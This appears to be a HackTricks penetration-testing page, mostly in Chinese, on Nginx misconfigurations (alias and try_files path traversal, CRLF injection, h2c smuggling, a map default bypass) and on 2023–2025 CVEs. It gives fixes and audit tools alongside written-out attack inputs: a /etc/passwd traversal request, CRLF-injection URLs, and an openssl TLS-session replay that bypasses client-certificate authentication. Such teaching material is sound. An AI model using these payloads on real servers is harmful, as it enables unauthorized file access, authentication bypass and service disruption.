# Nginx

{{#include ../../banners/hacktricks-training.md}}


## 缺少 root location <a href="#missing-root-location" id="missing-root-location"></a>

在配置 Nginx 服务器时，**root directive** 在定义用于提供文件的基目录方面起着关键作用。请看下面的示例：
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
在此配置中，`/etc/nginx` 被指定为 root 目录。该设置允许访问位于指定 root 目录下的文件，例如 `/hello.txt`。但需要注意的是，仅定义了一个特定的 location（`/hello.txt`）。没有为根位置（`location / {...}`）配置。这一遗漏意味着 root 指令在全局生效，使得对根路径 `/` 的请求能够访问 `/etc/nginx` 下的文件。

该配置带来了严重的安全隐患。一个简单的 `GET` 请求，如 `GET /nginx.conf`，可能会通过返回位于 `/etc/nginx/nginx.conf` 的 Nginx 配置文件而暴露敏感信息。将 root 设置为不那么敏感的目录（例如 `/etc`）可以降低此风险，但仍可能导致对其他关键文件的非预期访问，包括其他配置文件、访问日志，甚至用于 HTTP basic authentication 的加密凭证。

## Alias LFI 错误配置 <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

在 Nginx 的配置文件中，应仔细检查 "location" 指令。一个名为 Local File Inclusion (LFI) 的漏洞可能会通过类似下面的配置无意中引入：
```
location /imgs {
alias /path/images/;
}
```
该配置容易受到 LFI 攻击，因为服务器会将像 `/imgs../flag.txt` 这样的请求解释为尝试访问意图目录之外的文件，实际上解析为 `/path/images/../flag.txt`。此缺陷允许攻击者检索服务器文件系统中不应通过 web 访问的文件。

为减轻此漏洞，应将配置调整为：
```
location /imgs/ {
alias /path/images/;
}
```
更多信息: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix 测试：
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## 不安全的路径限制 <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

请查看以下页面，了解如何绕过类似于以下的指令：
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## 不安全的变量使用 / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> 存在漏洞的变量是 `$uri` 和 `$document_ur`i，可通过将它们替换为 `$request_uri` 修复。
>
> 正则表达式也可能存在类似漏洞，例如：
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Not vulnerable (checking spaces)
>
> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable

下面的示例演示了 Nginx 配置中的一个漏洞：
```
location / {
return 302 https://example.com$uri;
}
```
字符 \r (Carriage Return) 和 \n (Line Feed) 在 HTTP requests 中表示换行字符，它们的 URL 编码形式为 `%0d%0a`。向配置错误的服务器在请求中包含这些字符（例如 `http://localhost/%0d%0aDetectify:%20clrf`）会导致服务器生成一个名为 `Detectify` 的新 header。这是因为 $uri 变量会解码 URL 编码的换行字符，从而在响应中导致出现意外的 header：
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
在 [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/) 了解有关 CRLF injection 和 response splitting 风险的更多信息。

此外，该技术在 [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) 中有讲解，包含一些易受攻击的示例和检测机制。例如，要从黑盒角度检测此错误配置，可以尝试以下请求：

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

如果存在漏洞，第一个请求会返回（因为 X 可以是任何 HTTP method），而第二个请求会返回错误，因为 H 不是有效的方法。因此服务器会收到类似 `GET / H HTTP/1.1` 的请求，这会触发错误。

另一些检测示例：

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

该讲座中展示的一些易受攻击的配置示例包括：

- 注意 **`$uri`** 在最终 URL 中被按原样设置
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- 注意再次在 URL 中出现 **`$uri`**（这次在参数内部）
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- 现在在 AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### 任意变量

发现**用户提供的数据**在某些情况下可能被当作 **Nginx variable** 处理。 这种行为的原因尚不明晰，既不罕见也不容易验证。 这一异常在 HackerOne 的一份安全报告中被指出，可在[here](https://hackerone.com/reports/370094) 查看。 对错误信息的进一步调查发现它出现在 Nginx 代码库的 [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) 中，并将 Server Side Includes (SSI) 确定为根本原因。

要**检测此错误配置**，可以执行以下命令，设置 Referer header 来测试变量输出：
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
对这种配置错误的扫描显示，多处实例允许用户打印 Nginx 变量。然而，易受攻击的实例数量减少表明修补该问题的工作在某种程度上是成功的。

### 使用 try_files 与 $URI$ARGS 变量

以下 Nginx 配置错误可能导致 LFI 漏洞：
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
在我们的配置中有指令 `try_files`，用于按指定顺序检查文件是否存在。Nginx 将返回找到的第一个文件。`try_files` 指令的基本语法如下：
```
try_files file1 file2 ... fileN fallback;
```
Nginx 会按指定顺序检查每个文件是否存在。如果某个文件存在，则会立即返回该文件。如果指定的文件都不存在，请求将被传递到回退选项，回退选项可以是另一个 URI 或特定的错误页面。

但是，当在该指令中使用 `$uri$args` 变量时，Nginx 会尝试查找与请求 URI 以及任何查询字符串参数组合相匹配的文件。因此我们可以利用这种配置：
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
使用以下 payload：
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
使用我们的 payload，我们将逃出根目录（在 Nginx 配置中定义）并加载 `/etc/passwd` 文件。在调试日志中我们可以观察到 Nginx 尝试这些文件：
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC againts Nginx using the configuration mentioned above:
![Example burp request](../../images/nginx_try_files.png)

## 原始后端响应读取

Nginx 通过 `proxy_pass` 提供了一个功能，允许拦截后端产生的错误和 HTTP 头部，目的是隐藏内部错误信息和头部。  
这是通过 Nginx 在后端出错时返回自定义错误页面来实现的。  
然而，当 Nginx 遇到无效的 HTTP 请求时会出现问题。这类请求会原样转发到后端，后端的原始响应会在没有 Nginx 干预的情况下直接返回给客户端。

考虑一个涉及 uWSGI 应用的示例场景：
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
为此，在 Nginx 配置中使用了特定指令：
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): 该指令使 Nginx 能够为后端返回状态码大于 300 的响应提供自定义响应。它确保对于我们的示例 uWSGI 应用，`500 Error` 响应会被拦截并由 Nginx 处理。
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): 顾名思义，该指令会将指定的 HTTP 头从客户端隐藏，从而增强隐私和安全性。

当发出有效的 `GET` 请求时，Nginx 会正常处理，返回标准错误响应而不会泄露任何 secret headers。但当发出无效的 HTTP 请求时，会绕过此机制，导致暴露后端的原始响应，包括 secret headers 和错误信息。

## merge_slashes set to off

默认情况下，Nginx 的 **`merge_slashes` directive** 设置为 **`on`**，它会将 URL 中的多个正斜杠压缩为单个斜杠。该功能在简化 URL 处理的同时，可能会无意中掩盖位于 Nginx 后端的应用中存在的漏洞，特别是易受 LFI 攻击的应用。安全专家 **Danny Robinson and Rotem Bar** 已指出这种默认行为在 Nginx 作为反向代理时可能带来的潜在风险。

为减轻此类风险，建议对易受这些漏洞影响的应用 **将 `merge_slashes` directive 关闭**。这可确保 Nginx 在将请求转发给应用时不更改 URL 结构，从而不会掩盖任何潜在的安全问题。

欲了解更多信息，请查看 [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)。

### **Maclicious Response Headers**

如 [**this writeup**](https://mizu.re/post/cors-playground) 所示，某些如果出现在 Web 服务器响应中的头会改变 Nginx 代理的行为。你可以在 [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) 中查看它们：

- `X-Accel-Redirect`: 指示 Nginx 将请求内部重定向到指定位置。
- `X-Accel-Buffering`: 控制 Nginx 是否应对响应进行缓冲。
- `X-Accel-Charset`: 在使用 X-Accel-Redirect 时为响应设置字符集。
- `X-Accel-Expires`: 在使用 X-Accel-Redirect 时为响应设置过期时间。
- `X-Accel-Limit-Rate`: 在使用 X-Accel-Redirect 时限制响应的传输速率。

例如，头 **`X-Accel-Redirect`** 会在 nginx 中触发一次内部 **redirect**。因此，如果 nginx 配置中存在类似 **`root /`** 的设置，并且 Web 服务器的响应带有 **`X-Accel-Redirect: .env`**，则 nginx 会发送 **`/.env`** 的内容（Path Traversal）。

### **Default Value in Map Directive**

在 **Nginx configuration** 中，`map` directive 经常在 **authorization control** 中发挥作用。一个常见错误是没有指定 **default** 值，这可能导致未授权访问。例如：
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
如果没有 `default`，**恶意用户** 可以通过访问 `/map-poc` 内的 **未定义的 URI** 来绕过安全。 [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) 建议设置一个 **默认值** 以避免此类问题。

### **DNS Spoofing Vulnerability**

在某些条件下，针对 Nginx 的 DNS 欺骗是可行的。如果攻击者知道 Nginx 使用的 **DNS server** 并且能够截获其 DNS 查询，就可以伪造 DNS 记录。然而，如果 Nginx 配置为使用 **localhost (127.0.0.1)** 进行 DNS 解析，此方法则无效。Nginx 允许按如下方式指定 DNS server：
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` and `internal` Directives**

**`proxy_pass`** 指令用于将请求重定向到其他服务器，可以是内部或外部。**`internal`** 指令确保某些 location 仅能在 Nginx 内部访问。尽管这些指令本身并非漏洞，但其配置需要仔细检查以防止安全疏漏。

## proxy_set_header Upgrade & Connection

如果 nginx 服务器被配置为传递 Upgrade 和 Connection 头，可能会进行 [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) 以访问受保护/内部端点。

> [!CAUTION]
> 此漏洞将允许攻击者**与 `proxy_pass` endpoint 建立直接连接**（此示例中为 `http://backend:9999`），其内容不会被 nginx 检查。

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> 请注意，即使 `proxy_pass` 指向一个特定的 **path**（例如 `http://backend:9999/socket.io`），连接也会与 `http://backend:9999` 建立，因此你可以 **contact any other path inside that internal endpoint. So it doesn't matter if a path is specified in the URL of proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

在 2024 年，Nginx 披露了 CVE-2024-31079、CVE-2024-32760、CVE-2024-34161 和 CVE-2024-35200，表明在编译并启用实验性的 `ngx_http_v3_module` 且暴露了 `listen ... quic` socket 的情况下，单个 **single hostile QUIC session** 可能会导致 worker 进程崩溃或发生 leak memory。受影响的构建为 1.25.0–1.25.5 和 1.26.0，1.27.0/1.26.1 已包含修复；memory disclosure (CVE-2024-34161) 还要求 MTU 大于 4096 字节才能使敏感数据显现（详情见下方 2024 nginx advisory）。

**Recon & exploitation hints**

- HTTP/3 是可选的，所以扫描 `Alt-Svc: h3=":443"` 响应或对 UDP/443 QUIC 握手进行暴力探测；一旦确认，使用自定义 `quiche-client`/`nghttp3` 有效载荷对握手和 STREAM 帧进行 fuzz，以触发 worker 崩溃并强制产生 log leakage。
- 使用以下方法快速指纹目标支持：
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

2025年2月的通告披露，使用 OpenSSL 构建的 nginx 1.11.4–1.27.3 允许 **重用 TLS 1.3 会话**，在基于名称的虚拟主机之间互用，因此与无需证书的主机协商过的客户端可以重放 ticket/PSK，跳入受 `ssl_verify_client on;` 保护的 vhost，从而完全绕过 mTLS。该漏洞在多个虚拟主机共享相同的 TLS 1.3 会话缓存和票据时触发（参见下文的 2025 nginx 通告）。

**攻击者流程**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
如果目标存在此类漏洞，第二次握手会在不出示客户端证书的情况下完成，从而暴露受保护的位置。

**What to audit**

- 共享 `ssl_session_cache shared:SSL` 且启用了 `ssl_session_tickets on;` 的混合 `server_name` 块。
- 期望使用 mTLS 的 Admin/API 块却从公开主机继承了共享的会话缓存/票证设置。
- 通过自动化（例如 Ansible roles）在全局启用 TLS 1.3 会话恢复而未考虑 vhost 隔离的情形。

## HTTP/2 Rapid Reset 抵御能力 (CVE-2023-44487 行为)

当操作员将 `keepalive_requests` 或 `http2_max_concurrent_streams` 提高到默认值之外时，HTTP/2 Rapid Reset 攻击 (CVE-2023-44487) 仍然会影响 nginx：攻击者打开一个 HTTP/2 连接，用成千上万的 streams 泛洪它，然后立即发送 `RST_STREAM` 帧，从而使并发上限始终无法达到，而 CPU 则在连接拆解逻辑上持续消耗。Nginx 的默认值（128 并发流、1000 keepalive 请求）将影响范围保持较小；将这些限制“显著提高”会让单个客户端就能轻易耗尽 worker 进程（参见下面引用的 F5 write-up）。

**检测提示**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
暴露出这些指令异常高值的主机是主要目标：一个 HTTP/2 客户端可以循环创建流并立即发送 `RST_STREAM` 帧，从而持续占用 CPU 而不触发并发上限。

## 自己动手试试

Detectify 已创建了一个 GitHub 仓库，你可以使用 Docker 搭建一个包含本文所述部分错误配置的易受攻击的 Nginx 测试服务器，并自行尝试发现这些问题！

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## 静态分析工具

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (an updated fork of GIXY) 是一个用于分析 Nginx 配置的工具，旨在发现漏洞、不安全的指令和高风险的错误配置。它还会发现影响性能的错误配置，并检测遗漏的加固机会，从而实现自动化的缺陷检测。
- [gixy-ng](https://github.com/dvershinin/gixy) (the actively maintained fork of GIXY) 是一个用于分析 Nginx 配置的工具，旨在发现漏洞、不安全的指令和高风险的错误配置。它还会发现影响性能的错误配置，并检测遗漏的加固机会，从而实现自动化的缺陷检测。

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner 是一个用于查找常见 Nginx 错误配置和漏洞的简单工具。

## 参考

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
